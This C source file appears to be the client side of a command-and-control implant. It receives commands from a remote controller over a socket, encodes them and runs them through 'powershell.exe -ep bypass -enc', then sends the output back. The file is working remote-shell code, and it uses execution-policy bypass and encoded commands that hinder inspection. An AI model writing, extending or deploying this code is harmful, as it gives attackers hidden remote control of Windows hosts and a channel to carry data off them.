#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "c2.h"
#include "client/utils.h"
#include "common.h"

static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Encode binary data to Base64 text
static void b64_encode(const unsigned char *in, int len, char *out) {
    int i = 0, j = 0;
    unsigned char c3[3];
    while (len--) {
        c3[i++] = *(in++);
        if (i == 3) {
            out[j++] = b64[c3[0] >> 2];
            out[j++] = b64[((c3[0] & 3) << 4) | (c3[1] >> 4)];
            out[j++] = b64[((c3[1] & 15) << 2) | (c3[2] >> 6)];
            out[j++] = b64[c3[2] & 63];
            i = 0;
        }
    }
    if (i) {
        out[j++] = b64[c3[0] >> 2];
        out[j++] = b64[((c3[0] & 3) << 4) | (i == 2 ? (c3[1] >> 4) : 0)];
        out[j++] = (i == 2 ? b64[(c3[1] & 15) << 2] : '=');
        out[j++] = '=';
    }
    out[j] = '\0';
}

int psh_exec(sock_t sock, const char *cmd) {
    if (!cmd || !*cmd) return -1;

    int cmdlen = (int)strlen(cmd);

    // powershell -enc expects Base64 of UTF-16LE encoded command
    unsigned short unicode[4096] = {0};
    if (cmdlen > (int)(sizeof(unicode)/sizeof(unicode[0]) - 1)) return -1;
    for (int i = 0; i < cmdlen; i++) unicode[i] = (unsigned short)(unsigned char)cmd[i];

    char encoded[8192];
    b64_encode((unsigned char*)unicode, cmdlen * 2, encoded);

    char fullcmd[8192];
    // Compose final command string for _popen
    snprintf(fullcmd, sizeof(fullcmd), "powershell.exe -ep bypass -enc %s", encoded);

    // Launch PowerShell and capture stdout pipe
    FILE *fp = _popen(fullcmd, "r");

    char buf[C2_BUF_SIZE];
    while (fgets(buf, sizeof(buf), fp)) {
        printf("%s", buf);
        safe_send_payload(sock, buf, (int)strlen(buf) + 1, 0);
    }

    _pclose(fp);
    return 0;
}

void psh_receive(sock_t sock) {
    while (1) {
        char* cmd = (char*)safe_recv_payload(sock, NULL, 0);

        if (strcmp(cmd, "quit") == 0) break;

        printf("C2> %s\n", cmd);

        psh_exec(sock, cmd);
        free(cmd);
    }
    return;
}
